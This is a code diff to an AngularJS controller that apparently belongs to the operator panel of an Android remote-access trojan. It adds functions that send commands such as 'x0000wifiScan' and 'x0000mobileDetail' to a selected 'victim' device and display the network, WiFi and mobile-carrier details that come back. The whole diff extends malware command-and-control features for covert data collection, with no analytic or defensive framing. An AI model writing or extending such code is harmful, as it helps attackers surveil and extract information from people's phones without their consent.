@@ -278,6 +278,208 @@ app.controller("AppCtrl", ($scope) => {
         }
     };
 
+    // Network Information Functions
+    $appCtrl.networkData = null;
+    $appCtrl.wifiNetworks = null;
+    $appCtrl.isLoadingNetwork = false;
+    $appCtrl.networkError = null;
+
+    $appCtrl.getNetworkInfo = () => {
+        if (!$appCtrl.selectedVictim || !$appCtrl.selectedVictim.isOnline) {
+            $appCtrl.Log('[!] Please select an online device first', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+
+        $appCtrl.isLoadingNetwork = true;
+        $appCtrl.networkError = null;
+        $appCtrl.networkData = null;
+        $appCtrl.wifiNetworks = null;
+
+        try {
+            const socket = io();
+            socket.emit('order', {
+                order: 'x0000net',
+                extra: ''
+            });
+
+            socket.on('x0000net', (data) => {
+                if (data.error) {
+                    $appCtrl.networkError = data.error;
+                    $appCtrl.Log(`[!] Network info error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    $appCtrl.networkData = data;
+                    $appCtrl.Log('[✓] Network information retrieved successfully', CONSTANTS.logStatus.SUCCESS);
+                }
+                $appCtrl.isLoadingNetwork = false;
+                $appCtrl.$apply();
+            });
+
+            socket.on('connect_error', (error) => {
+                $appCtrl.networkError = `Connection error: ${error.message}`;
+                $appCtrl.isLoadingNetwork = false;
+                $appCtrl.Log(`[!] Connection error: ${error.message}`, CONSTANTS.logStatus.FAIL);
+                $appCtrl.$apply();
+            });
+
+        } catch (error) {
+            $appCtrl.networkError = `Error: ${error.message}`;
+            $appCtrl.isLoadingNetwork = false;
+            $appCtrl.Log(`[!] Error getting network info: ${error.message}`, CONSTANTS.logStatus.FAIL);
+            $appCtrl.$apply();
+        }
+    };
+
+    $appCtrl.getWifiInfo = () => {
+        if (!$appCtrl.selectedVictim || !$appCtrl.selectedVictim.isOnline) {
+            $appCtrl.Log('[!] Please select an online device first', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+
+        $appCtrl.isLoadingNetwork = true;
+        $appCtrl.networkError = null;
+
+        try {
+            const socket = io();
+            socket.emit('order', {
+                order: 'x0000wifi',
+                extra: ''
+            });
+
+            socket.on('x0000wifi', (data) => {
+                if (data.error) {
+                    $appCtrl.networkError = data.error;
+                    $appCtrl.Log(`[!] WiFi info error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    $appCtrl.networkData = { wifi: data };
+                    $appCtrl.Log('[✓] WiFi information retrieved successfully', CONSTANTS.logStatus.SUCCESS);
+                }
+                $appCtrl.isLoadingNetwork = false;
+                $appCtrl.$apply();
+            });
+
+        } catch (error) {
+            $appCtrl.networkError = `Error: ${error.message}`;
+            $appCtrl.isLoadingNetwork = false;
+            $appCtrl.Log(`[!] Error getting WiFi info: ${error.message}`, CONSTANTS.logStatus.FAIL);
+            $appCtrl.$apply();
+        }
+    };
+
+    $appCtrl.scanWifiNetworks = () => {
+        if (!$appCtrl.selectedVictim || !$appCtrl.selectedVictim.isOnline) {
+            $appCtrl.Log('[!] Please select an online device first', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+
+        $appCtrl.isLoadingNetwork = true;
+        $appCtrl.networkError = null;
+
+        try {
+            const socket = io();
+            socket.emit('order', {
+                order: 'x0000wifiScan',
+                extra: ''
+            });
+
+            socket.on('x0000wifiScan', (data) => {
+                if (data.error) {
+                    $appCtrl.networkError = data.error;
+                    $appCtrl.Log(`[!] WiFi scan error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    $appCtrl.wifiNetworks = data;
+                    $appCtrl.Log(`[✓] WiFi scan completed. Found ${data.length} networks`, CONSTANTS.logStatus.SUCCESS);
+                }
+                $appCtrl.isLoadingNetwork = false;
+                $appCtrl.$apply();
+            });
+
+        } catch (error) {
+            $appCtrl.networkError = `Error: ${error.message}`;
+            $appCtrl.isLoadingNetwork = false;
+            $appCtrl.Log(`[!] Error scanning WiFi networks: ${error.message}`, CONSTANTS.logStatus.FAIL);
+            $appCtrl.$apply();
+        }
+    };
+
+    $appCtrl.getMobileInfo = () => {
+        if (!$appCtrl.selectedVictim || !$appCtrl.selectedVictim.isOnline) {
+            $appCtrl.Log('[!] Please select an online device first', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+
+        $appCtrl.isLoadingNetwork = true;
+        $appCtrl.networkError = null;
+
+        try {
+            const socket = io();
+            socket.emit('order', {
+                order: 'x0000mobile',
+                extra: ''
+            });
+
+            socket.on('x0000mobile', (data) => {
+                if (data.error) {
+                    $appCtrl.networkError = data.error;
+                    $appCtrl.Log(`[!] Mobile info error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    $appCtrl.networkData = { mobile: data };
+                    $appCtrl.Log('[✓] Mobile information retrieved successfully', CONSTANTS.logStatus.SUCCESS);
+                }
+                $appCtrl.isLoadingNetwork = false;
+                $appCtrl.$apply();
+            });
+
+        } catch (error) {
+            $appCtrl.networkError = `Error: ${error.message}`;
+            $appCtrl.isLoadingNetwork = false;
+            $appCtrl.Log(`[!] Error getting mobile info: ${error.message}`, CONSTANTS.logStatus.FAIL);
+            $appCtrl.$apply();
+        }
+    };
+
+    $appCtrl.getMobileDetail = () => {
+        if (!$appCtrl.selectedVictim || !$appCtrl.selectedVictim.isOnline) {
+            $appCtrl.Log('[!] Please select an online device first', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+
+        $appCtrl.isLoadingNetwork = true;
+        $appCtrl.networkError = null;
+
+        try {
+            const socket = io();
+            socket.emit('order', {
+                order: 'x0000mobileDetail',
+                extra: ''
+            });
+
+            socket.on('x0000mobileDetail', (data) => {
+                if (data.error) {
+                    $appCtrl.networkError = data.error;
+                    $appCtrl.Log(`[!] Mobile detail error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    $appCtrl.networkData = { mobile: data };
+                    $appCtrl.Log('[✓] Mobile detailed information retrieved successfully', CONSTANTS.logStatus.SUCCESS);
+                }
+                $appCtrl.isLoadingNetwork = false;
+                $appCtrl.$apply();
+            });
+
+        } catch (error) {
+            $appCtrl.networkError = `Error: ${error.message}`;
+            $appCtrl.isLoadingNetwork = false;
+            $appCtrl.Log(`[!] Error getting mobile detail: ${error.message}`, CONSTANTS.logStatus.FAIL);
+            $appCtrl.$apply();
+        }
+    };
+
+    $appCtrl.clearNetworkData = () => {
+        $appCtrl.networkData = null;
+        $appCtrl.wifiNetworks = null;
+        $appCtrl.networkError = null;
+        $appCtrl.$apply();
+    };
+
 
     // app logs to print any new log in the black terminal
     $appCtrl.Log = (msg, status) => {
